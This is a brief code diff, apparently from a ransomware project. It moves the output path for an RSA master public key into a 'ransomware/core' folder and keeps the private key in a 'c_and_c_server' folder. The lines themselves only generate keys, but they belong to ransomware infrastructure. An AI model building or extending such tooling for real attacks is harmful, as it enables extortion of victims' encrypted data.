@@ -36,7 +36,7 @@ class RSA:
 if __name__ == "__main__":
     key_generator = RSA()
 
-    public_key_path = "../ransomware/basic_functionality/MASTER_PUBLIC_KEY"
+    public_key_path = "../ransomware/core/MASTER_PUBLIC_KEY"
     private_key_path = "../c_and_c_server/MASTER_PRIVATE_KEY"
 
     with open(public_key_path, "wb") as ransomware_public_key_file:
